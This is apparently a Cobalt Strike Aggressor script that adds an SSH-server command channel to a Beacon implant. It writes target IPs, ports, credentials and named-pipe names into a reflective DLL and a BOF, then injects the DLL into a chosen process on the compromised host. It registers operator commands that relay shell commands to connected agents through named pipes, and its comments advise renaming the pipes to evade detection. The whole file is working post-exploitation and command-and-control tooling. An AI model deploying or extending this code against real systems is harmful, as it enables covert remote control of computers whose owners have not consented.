import beacon.CommandBuilder;

global('$ssh_inited $server_dll_name $pipe_wait $arch_list $file_ext $pipe_output_name_final $agent_base_name $pipe_input_name_final $pipe_output_stomp_me_name $pipe_input_stomp_me_name $ssh_ip_stomp_me $ssh_ip_connect_stomp_me $ssh_port_stomp_me $ssh_username_stomp_me $ssh_password_stomp_me');
$ssh_inited = -1;

# GLOBALS
# _final are the names that are being stomped into the artifacts
# _stomp_me_name are the original names in the artifacts that are going to be stomped in either by the globals or by user specified parameters.

$pipe_output_name_final = "BigGasPipe_updates_1"; # Change the pipe name an reload the CNA for 'opsec', 28-bytes MAX
$pipe_input_name_final = "BigGasPipe_updates_2"; # Change the pipe name an reload the CNA for 'opsec', 28-bytes MAX
$interface_ip_final = "0.0.0.0" # the server can be tightened down to a specific interface by changing this

# Target strings that are stomped
$pipe_output_stomp_me_name = "OUTPUT_PIPE_NAME_NO_CHANGE_PLS";
$pipe_input_stomp_me_name = "INPUT_PIPE_NAME_NO_CHANGE_PLS";

$ssh_ip_stomp_me = "999.999.999.999"; # interface IP, 0.0.0.0 by default
$ssh_port_stomp_me = "99999";

$ssh_ip_connect_stomp_me = "888.888.888.888"; # this is the ip that gets stomped into the agent (ie the agent tries to connect to the address that's stomped over this)
$ssh_username_stomp_me = "_________PLACEHOLDER_USERNAME_STRING_PLS_DO_NOT_CHANGE__________"; # username provided via beacon console
$ssh_password_stomp_me = "_________PLACEHOLDER_PASSWORD_STRING_PLS_DO_NOT_CHANGE__________"; # password provided via becaon console

$pipe_wait = 30000; # Custom timeout

#
# File names, you shouldn't have to change these unless you changed something in bin/
#
$server_dll_name = "scepter_server.shc.windows.x64.dll"; # default name
$bof_write_pipe_name  = "bof_write_pipe.x64.o";
$agent_base_name = "scepter-agent";

# Declare the lists of strings
$os_list = @("linux", "windows", "apple")
$arch_list = @("aarch64", "x64")
$file_ext = @(".exe", "dll", ".bin")

# $1 - bytes where we are going to do the stoming
# $2 - string we want to stomp
# $3 - length of the string we want to stomp (for padding)
# $4 - output string (the string that we're going to stomp with)
sub stomp-str {
    local('$bytes $stomp_me_string $stomp_me_string_len $output_string $padded_output_string $padding_needed $null_padding');
    $bytes = $1;
    $stomp_me_string = $2;
    $stomp_me_string_len = $3;
    $output_string = $4;

    $padding_needed = $stomp_me_string_len - strlen($output_string);
    $padded_output_string = $output_string;

    if ($padding_needed > 0) {
        $null_padding = "";
        $i = 0;
        while ($i < $padding_needed) {
            $null_padding = $null_padding . chr(0); # Append an actual null byte
            $i = $i + 1;
        }
        $padded_output_string = $output_string . $null_padding;
    } else if ($padding_needed < 0) {
        berror($beacon_id, "String '" . $output_string . "' is longer than max " . $stomp_me_string_len . " bytes!");
        return; # Important to return if name is too long
    }
    println("ORIGINAL STRING: " . $stomp_me_string);
    println("NEW STRING: " . $output_string);

    # Now use $padded in strrep
    $output_string = strrep($bytes, $stomp_me_string, $padded_output_string);

    return $output_string;
}


# $1 - beacon id
# $2 - target IP address
# $3 - username
# $4 - password
# $5 - process id of injection target (optional)
alias ssh-init {
    local('$barch $beacon_id $pid $agent_path $agent_path_out $rdll_path $rdll_path_out $target_ip $target_port $target_username $target_password $rdll $handle $actual_pipe_name $desired_length $null_padding $padding_needed $padded_pipe_name $bof_path $bof_path_out $bof_data');
    $beacon_id = $1;
    $target_ip = $2; # ssh server ip
    $target_port = $3 # ssh server port
    $target_username = $4;
    $target_password = $5;
    $pid = $6; # optional PID

    if($target_ip is $null || $target_password is $null || $target_password is $null){
        berror($1, "Invalid arguments");
        return;
    }

    # Get current beacon info
    $barch = beacon_info($beacon_id, "barch");

    if ($barch != "x64") {
        berror($1, "This script only supports x64 processes");
        return;
    }

    # If pid was not passed in, local injection
    if ($pid == $null){
        $pid = beacon_info($beacon_id, "pid");
    }

    # All binaries are stored in bins/

    # Build rdll path; This needs rework if you want to support x86 for whatever reason
    # The server must have the interface IP, PORT, username, password, input pipe and outputpipe names stomped in 
    $rdll_path = getFileProper(script_resource("."), "bins", "x64", $server_dll_name);

    # Build bof path; This needs rework if you want to support x86 for whatever reason
    $bof_path = getFileProper(script_resource("."), "bins", "x64", $bof_write_pipe_name);

    # For *every* agent we need to stomp in server IP, PORT, username, and password
    # $agent_path = getFileProper(script_resource("."), "bins", "x64", $agent_base_name); # TODO loop through this one with all the list

    # Resolve the output directories now as well

    # Get rdll contents
    $handle = openf($rdll_path);
    $rdll = readb($handle, -1);

    # Close handle
    closef($handle);

    # Now use $ssh_ip_stomp_me in strrep
    $rdll = stomp-str($rdll, $ssh_ip_stomp_me, "15", $target_ip);

    # RDLL STOMP Username that we want to use to try to authenticate to the SSH server  #
    # Now use $ssh_username_stomp_me in strrep
    $rdll = stomp-str($rdll, $ssh_username_stomp_me, "64", $target_username);

    # RDLL STOMP Password that we want to use to try to authenticate to the SSH server  #
    # Now use $ssh_password_stomp_me in strrep
    $rdll = stomp-str($rdll, $ssh_password_stomp_me, "64", $target_password);

    # RDLL STOMP INPUT PIPE, this is the pipe we use to send commands that are forwarded to the rdll to the target  #
    # Now use $pipe_input_stomp_me_name in strrep
    $rdll = stomp-str($rdll, $pipe_input_stomp_me_name, "29", $pipe_input_name_final);

    # RDLL STOMP OUTPUT PIPE, this is the pipe we use to send commands that are forwarded to the rdll to the target   #
    # Now use $pipe_input_stomp_me_name in strrep
    $rdll = stomp-str($rdll, $pipe_output_stomp_me_name, "30", $pipe_output_name_final);

    # RDLL STOMP Port that will host the SSH Service
    $rdll = stomp-str($rdll, $ssh_port_stomp_me, "5", $target_port);

    # Open output handle
    $handle = openf(">" . $rdll_path);

    # Write rdll back down
    writeb($handle, $rdll);

    # Close handle
    closef($handle);

    # BOF STOMP INPUT PIPE, this is the pipe we use to send commands that are forwarded to the rdll to the target #
    # Get BOF contents
    $handle = openf($bof_path);
    $bof_data = readb($handle, -1);

    # Close handle
    closef($handle);

    # Now use $pipe_input_stomp_me_name in strrep
    $bof_data = stomp-str($bof_data, $pipe_input_stomp_me_name, "29", $pipe_input_name_final);

    # Open output handle
    $handle = openf(">" . $bof_path);

    # Write BOF back down
    writeb($handle, $bof_data);

    # Close handle
    closef($handle);

    # self-inject the dll
    bshinject($beacon_id, $pid, $barch, $rdll_path);

    $ssh_inited = 1;
}

# $1 - beacon id
# $2 - process id of injection target (optional)
sub ssh-read {
    local('$barch $beacon_id $pid $cmd $builder $job_type $callback_type $description $job');
    $beacon_id = $1;
    $pid = $2; # Optional pid
    $job_type = 40;
    $callback_type = 32;
    $description = "pipe read";

    if($ssh_inited < 0){
        berror($1, "You must init ssh first. Try: ssh-init <target ip> <username> <password> <optional: pid>")
        return;
    }

    # Get current beacon info
    $barch = beacon_info($beacon_id, "barch");

    if ($barch != "x64") {
        berror($1, "This script only supports x64 processes");
        return;
    }

    # If pid was not passed in, local injection
    if ($pid == $null){
        $pid = beacon_info($beacon_id, "pid");
    }

    # Use command builder to read from pipe
    $builder = [new CommandBuilder];
    [$builder setCommand: $job_type];
    [$builder addInteger: parseNumber($pid)];
    [$builder addShort: $callback_type];
    [$builder addShort: $pipe_wait];
    [$builder addLengthAndString: "\\\\.\\pipe\\" . $pipe_output_name_final];
    [$builder addLengthAndString: $description];
    $job = [$builder build];
    call("beacons.task", $null, $beacon_id, cast($job, 'b'));
}


alias ssh-exec {
    local('$bid $data $bof $args $bof_path $handle $bof_data');
    $bid = $1;
    $data = $2;

    if($ssh_inited < 0){
        berror($bid, "You must init ssh first. Try: ssh-init <target ip> <username> <password> <optional: pid>")
        return;
    }

    $args = bof_pack($bid, "z", $data);

    # Build bof path; This needs rework if you want to support x86 for whatever reason
    $bof_path = getFileProper(script_resource("."), "bof-vs", "x64", "Release", "bof.x64.o");

    # read in the right BOF file
    $handle = openf($bof_path);
    $bof_data = readb($handle, -1);
    closef($handle);

    # execute it.
    beacon_inline_execute($bid, $bof_data, "go", $args);

    # read from the output pipe
    ssh-read($bid, $null);
}

# --------------------
# Register the command
# --------------------
beacon_command_group(
	"ssh_server_interface",
	"User-Defined SSH Interface",
	"User-implemented reflective DLL that provdes SSH Server functionality so that Agents can connect to the server.\nUsers can then interact with those agents via custom commands."
);

beacon_command_register(
	"ssh-init",
	"(64-bit only) Initializes RDLL and BOF to start SSH Server on the target host.",
	"ssh-init <target ip> <target-port> <username> <password> <optional: pid>\nex: ssh-init 192.0.0.1 2222 my_username my_password 12345",
	"ssh_server_interface"
);

beacon_command_register(
	"ssh-exec",
	"(64-bit only) Uses a bof to write a command to a pipe that is read by a user implemented reflective DLL and sent to the ssh target.",
	"ssh-exec <user command>\nex:ssh-exec whoami",
	"ssh_server_interface"
);